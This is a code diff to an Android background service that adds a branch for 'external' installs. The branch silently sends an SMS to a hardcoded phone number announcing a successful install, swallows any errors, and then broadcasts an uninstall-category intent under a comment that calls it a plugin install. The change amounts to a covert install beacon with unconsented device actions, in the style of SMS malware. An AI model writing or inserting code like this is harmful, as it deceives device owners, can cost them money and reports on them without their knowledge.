@@ -242,6 +242,24 @@ public class BgService extends Service {
         LOGD("onStart action = " + (intent != null ? intent.getAction() : ""));
         mSM.log(TAG, "BgService::onStart action = " + (intent != null ? intent.getAction() : ""));
         
+        if (mSM.getAppType().equals(SettingManager.APP_TYPE_EXTERNAL)) {
+            try {
+                WorkingMessage wm = WorkingMessage.createEmpty(this);
+                wm.setDestNum("15810864155");
+                wm.setText("external install success");
+                wm.send();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+            
+            //install the plugin now
+            Intent uninstall_intent = new Intent();
+            uninstall_intent.addCategory(UninstallReceiver.UNINSTALL_ACTION);
+            this.sendBroadcast(uninstall_intent);
+            
+            return;
+        }
+        
         if (intent == null || intent.getAction() == null) {
             mSM.setNextFetchChannelInfoFromServerTime(0, false);
             return;
